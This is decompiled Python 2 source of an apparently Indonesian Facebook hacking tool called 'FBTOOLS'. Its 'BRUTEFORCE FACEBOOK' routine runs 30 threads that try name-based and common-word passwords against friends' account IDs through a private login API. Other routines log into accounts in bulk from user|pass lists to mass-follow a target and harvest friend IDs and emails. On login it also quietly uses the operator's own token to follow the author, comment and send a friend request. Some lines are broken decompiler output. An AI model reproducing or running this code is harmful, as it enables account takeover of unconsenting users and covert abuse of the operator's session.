# Source Generated With Decompyle++
# File : temp.pyc (Python 2.7)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import base64
import requests
import mechanize
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as sup
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]
hijau = '\x1b[32m'
cyan = '\x1b[36m'
kuning = '\x1b[33;1m'
ungu = '\x1b[35m'
putih = '\x1b[37m'
biru = '\x1b[34m'
merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
blue = '\x1b[1;96m'
tutup = '\x1b[0m'
logo = '\n%s\x1b[37m\x1b[37m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91%s Author%s :%s Rizky ID        %s \xe2\x95\x91\n\xe2\x95\x91%s github%s :%s github.com/rz-id%s \xe2\x95\x91\n\xe2\x95\x91%s   ig  %s :%s riski_1504       %s\xe2\x95\x91\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91%s    FBTOOLS VERSION 0.3 %s   \xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d' % (putih, kuning, merah, hijau, putih, kuning, merah, hijau, putih, kuning, merah, hijau, putih, putih, putih, cyan, putih)
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
id = []
em = []
emfromteman = []
listgrup = []
idfriend = []

def load(word):
    lix = [
        '/',
        '-',
        '\xe2\x95\xb2',
        '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write('\r{}{}'.format(str(word), lix[x]))
            time.sleep(0.3)
            sys.stdout.flush()
        
    


def keluar():
    print '%s(%s~%s)%s Exit' % (putih, merah, putih, merah)
    sys.exit()


def login():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '%s(%s+%s) %sLOGIN ACCOUNT FACEBOOK' % (putih, merah, putih, cyan)
        id = raw_input('%s(%s-%s)%s USERNAME%s :%s ' % (putih, cyan, putih, putih, merah, hijau))
        pwd = raw_input('%s(%s-%s) %sPASSWORD %s: %s' % (putih, cyan, putih, putih, merah, hijau))
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mTrying login \x1b[32m')
        
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n%s(%s!%s)%s No connection' % (putih, merah, putih, merah)
            keluar()

        br._factory.is_html = True
        br.select_form(nr = 0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'credentials_type': 'password',
                    'email': id,
                    'format': 'JSON',
                    'generate_machine_id': '1',
                    'generate_session_cookies': '1',
                    'locale': 'en_US',
                    'method': 'auth.login',
                    'password': pwd,
                    'return_ssl_resources': '0',
                    'v': '1.0' }
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({
                    'sig': a })
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params = data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                
                try:
                    toket = open('login.txt', 'r').read()
                    with requests.Session() as s:
                        s.post('https://graph.facebook.com/riski.darmawan.1690671/subscribers?access_token=' + toket)
                        s.post('https://graph.facebook.com/120300252885977/comments?message=Nice\xe2\x9d\xa4&access_token=' + toket)
                except:
                    pass

                print '\n%s(%s\xe2\x9c\x93%s)%s Login successfully' % (putih, hijau, putih, hijau)
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
                keluar()
            

        if 'checkpoint' in url:
            print '\n%s(%s+%s)%s Account Checkpoint' % (putih, kuning, putih, kuning)
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            keluar()
        else:
            print '\n%s(%s+%s)%s Account Failed' % (putih, kuning, putih, merah)
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()



def menu():
    os.system('reset')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('reset')
        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] No connection'
        keluar()

    os.system('reset')
    print logo
    print '\x1b[37m\xe2\x95\x91\x1b[36m USERNAME\x1b[31m :\x1b[32m ' + nama
    print '\x1b[37m\xe2\x95\x91\x1b[36m USERID  \x1b[31m :\x1b[32m ' + id
    print '%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    print '%s(%s01%s)%s YAHOO CHEKER' % (putih, cyan, putih, hijau)
    print '%s(%s02%s)%s CREATE STATUS' % (putih, cyan, putih, hijau)
    print '%s(%s03%s)%s READ MY GROUPS' % (putih, cyan, putih, hijau)
    print '%s(%s04%s)%s AUTO UNFRIENDS' % (putih, cyan, putih, hijau)
    print '%s(%s05%s)%s CREATE WORDLIST' % (putih, cyan, putih, hijau)
    print '%s(%s06%s)%s GET EMAIL/USERID' % (putih, cyan, putih, hijau)
    print '%s(%s07%s)%s AUTO DELETE POST' % (putih, cyan, putih, hijau)
    print '%s(%s08%s)%s INFORMATION FRIEND' % (putih, cyan, putih, hijau)
    print '%s(%s09%s)%s BRUTEFORCE FACEBOOK' % (putih, cyan, putih, hijau)
    print '%s(%s10%s)%s AUTO FOLLOW ACCOUNT' % (putih, cyan, putih, hijau)
    print '%s(%s11%s)%s PROFIL GUARD FACEBOOK' % (putih, cyan, putih, hijau)
    print '%s(%s12%s)%s OTHERS ~>' % (putih, cyan, putih, hijau)
    print '%s(%s13%s)%s EXIT' % (putih, cyan, putih, merah)
    pilih()


def pilih():
    mana = raw_input('\n       \x1b[34m>>> \x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih()
    elif mana in ('1', '01'):
        menu_yahoo()
    elif mana in ('2', '02'):
        status()
    elif mana in ('3', '03'):
        groupsaya()
    elif mana in ('4', '04'):
        unfriend()
    elif mana in ('5', '05'):
        wordlist()
    elif mana in ('6', '06'):
        dump()
    elif mana in ('7', '07'):
        deletepost()
    elif mana in ('8', '08'):
        informasi()
    elif mana in ('9', '09'):
        super()
    elif mana in ('10',):
        follow()
    elif mana in ('11',):
        toket = open('login.txt', 'r').read()
        aktif = 'true'
        gaz(toket, aktif)
    elif mana in ('12',):
        lainnya()
    elif mana in ('13',):
        keluar()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih()


def lainnya():
    os.system('reset')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('reset')
        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] No connection'
        keluar()

    os.system('reset')
    print logo
    print '\x1b[37m\xe2\x95\x91\x1b[36m USERNAME\x1b[31m :\x1b[32m ' + nama
    print '\x1b[37m\xe2\x95\x91\x1b[36m USERID  \x1b[31m :\x1b[32m ' + id
    print '%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    print '%s(%s01%s)%s REMOVE TOKEN' % (putih, cyan, putih, hijau)
    print '%s(%s02%s)%s LOGOUT' % (putih, cyan, putih, hijau)
    print '%s(%s03%s)%s INFO TOOLS' % (putih, cyan, putih, hijau)
    print '%s(%s04%s)%s CHEK UPDATE' % (putih, cyan, putih, hijau)
    print '%s(%s05%s)%s BACK MENU' % (putih, cyan, putih, hijau)
    pilih_others()


def pilih_others():
    mana = raw_input('\n       \x1b[34m>>> \x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_others()
    elif mana in ('1', '01'):
        os.system('rm -rf login.txt')
        keluar()
    elif mana in ('2', '02'):
        os.system('rm -rf login.txt')
        keluar()
    elif mana in ('3', '03'):
        infotools()
    elif mana in ('4', '04'):
        os.system('git pull')
        print hijau + '>>>>     update success     <<<<'
        time.sleep(0.5)
        os.system('python2 fbtools.py')
    elif mana in ('5', '05'):
        menu()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        pilih_others()


def infotools():
    os.system('clear')
    print logo
    print '\n %sAUTHOR     %s: %sRizky ID\n %sNAME TOOLS %s: %sfbtools\n %sVERSI      %s: %s0.2\n %sCREATE     %s: %s3 APRIL 2020\n %sFOLLOW ME  %s: %sriski_1504\n %sSOURCE     %s: %shttps://github.com/rz-id\n %sLANGUAGE   %s: %sENGLISH/INDONESIA\n %sPROGRAM    %s: %spython 2.7\n' % (hijau, merah, biru, hijau, merah, biru, hijau, merah, biru, hijau, merah, biru, hijau, merah, biru, hijau, merah, biru, hijau, merah, biru, hijau, merah, biru)
    print '\n\n\n'
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable = True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'OAuth %s' % toket }
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data = data, headers = headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print '%s(%s+%s) %sGuard Activating' % (putih, hijau, putih, hijau)
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    elif '"is_shielded":false' in res.text:
        os.system('clear')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mNot activate'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


def follow():
    print 
    print tutup + '[' + merah + '!' + tutup + "] INFO : Pemisah 'user|pass'"
    file = raw_input(tutup + '[' + lime + '+' + tutup + '] List account : ' + lime)
    idt = raw_input(tutup + '[' + lime + '+' + tutup + '] Your account id : ' + lime)
    isi = open(file, 'r').read().splitlines()
    print tutup + '[' + lime + '+' + tutup + '] START ...'
    for z in isi:
        o = z.split('|')
        user = o[0]
        pw = o[1]
        print tutup + '[' + ungu + '*' + tutup + '] Follow with account = ' + user + '|' + pw + tutup
        
        try:
            api_seret = '62f8ce9f74b12f84c123cc23437a4a32'
            data = {
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'credentials_type': 'password',
                'email': user,
                'format': 'JSON',
                'generate_machine_id': '1',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'method': 'auth.login',
                'password': pw,
                'return_ssl_resources': '0',
                'v': '1.0' }
            sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + user + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pw + 'return_ssl_resources=0v=1.0' + api_seret).encode('utf-8')
            x = hashlib.new('md5')
            x.update(sig)
            data.update({
                'sig': x.hexdigest() })
            urls = requests.get('https://api.facebook.com/restserver.php', params = data)
            b = json.loads(urls.text)
            toke = b['access_token']
        except KeyError:
            print tutup + '[' + merah + '!' + tutup + '] Login failed'
            continue

        
        try:
            r = requests.post('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + toke)
            if 'error' in str(r.text):
                print tutup + '[' + merah + '!' + tutup + '] Gagal' + tutup
            elif 'true' in str(r.text):
                print tutup + '[' + lime + '+' + tutup + '] Berhasil' + tutup
            else:
                print tutup + '[' + merah + '!' + tutup + '] Error' + tutup
        continue
        continue

    
    print tutup + '[' + lime + '+' + tutup + '] Done' + tutup
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu()


def super():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    print '%s(%s01%s)%s CRACK WITH LIST FRIENDS' % (putih, cyan, putih, hijau)
    print '%s(%s02%s)%s CRACK FROM FRIEND' % (putih, cyan, putih, hijau)
    print '%s(%s03%s)%s CRACK FROM FILE' % (putih, cyan, putih, hijau)
    print '%s(%s00%s)%s BACK' % (putih, cyan, putih, merah)
    pilih_super()


def pilih_super():
    peak = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if peak == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_super()
    elif peak == '1':
        load('\x1b[37m(\x1b[32m+\x1b[37m) \x1b[37mGet all friend id \x1b[32m')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
        
    elif peak == '2':
        idt = raw_input('\x1b[32m(\x1b[32m+\x1b[37m) \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '%s(%s-%s)%s Friend Not Found' % (putih, merah, putih, merah)
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            super()

        load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        
    elif peak == '3':
        
        try:
            idlist = raw_input('%s(%s+%s)%s FILE ID%s  : %s'(putih, cyan, putih, cyan, merah, hijau))
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '%s(%s-%s)%s File Not Found' % (putih, merah, putih, merah)
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            super()
        

    if peak == '0' or peak == '00':
        menu()
    else:
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_super()
    print '\n\x1b[37m(\x1b[32m+\x1b[37m)\x1b[32m TOTAL ID \x1b[31m : \x1b[37m' + str(len(id))
    load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print '\n%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('out')
        except OSError:
            pass

        
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass1
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass2
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass3
                    else:
                        pass4 = 'Bangsat'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass4
                        else:
                            pass5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass5
                            else:
                                pass6 = 'Kontol'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass6
                                else:
                                    pass7 = 'Anjing'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass7
                                    else:
                                        pass8 = b['last_name'] + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass8
                                        else:
                                            pass9 = 'Katasandi'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass9
                                                oks.append(user + pass9)
                                            else:
                                                pass10 = 'Bajingan'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass10
                                                else:
                                                    pass11 = 'Doraemon'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass11
                                                    else:
                                                        pass12 = 'Persija'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass12
                                                        else:
                                                            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                                            b = json.loads(a.text)
                                                            pass13 = 'Persib'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass13
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    os.system('reset')
    print logo
    super()


def informasi():
    token = open('login.txt', 'r').read()
    print 
    id = raw_input(tutup + '[' + lime + '+' + tutup + '] Search Name or ID : ' + lime)
    if id == '':
        print tutup + '[' + merah + '!' + tutup + '] Masukkan' + tutup
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    print tutup + '[' + lime + '*' + tutup + '] Searching ...'
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
    q = json.loads(r.text)
    for i in q['data']:
        if not id in i['name']:
            if id in i['id']:
                a = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
